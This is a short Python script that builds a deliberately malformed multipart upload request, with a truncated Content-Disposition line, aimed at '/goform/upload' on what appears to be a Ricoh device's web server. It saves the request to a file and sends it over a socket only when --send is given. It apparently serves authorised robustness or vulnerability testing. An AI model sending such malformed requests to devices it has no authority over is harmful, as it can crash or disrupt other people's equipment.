#!/usr/bin/env python3
"""Generate a non-destructive malformed multipart request for validation.

The script writes payload.bin by default. Network transmission requires --send.
Use only on devices you own or are authorized to test.
"""
import argparse
import socket
from pathlib import Path

parser = argparse.ArgumentParser()
parser.add_argument("--host", default="127.0.0.1")
parser.add_argument("--port", type=int, default=10080)
parser.add_argument("--path", default='/goform/upload')
parser.add_argument("--send", action="store_true")
args = parser.parse_args()

boundary = "----RICOH-BOUNDARY"
# Deliberately omit the terminating CRLF from the Content-Disposition line.
body = (f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="file"; filename="a.bin"').encode()
request = (f"POST {args.path} HTTP/1.1\r\n"
           f"Host: {args.host}\r\n"
           f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
           f"Content-Length: {len(body)}\r\n"
           "Connection: close\r\n\r\n").encode() + body

Path("payload.bin").write_bytes(request)
print(f"wrote {len(request)} bytes to payload.bin")
if args.send:
    with socket.create_connection((args.host, args.port), timeout=5) as s:
        s.sendall(request)
        try:
            print(s.recv(4096))
        except socket.timeout:
            print("no response before timeout")
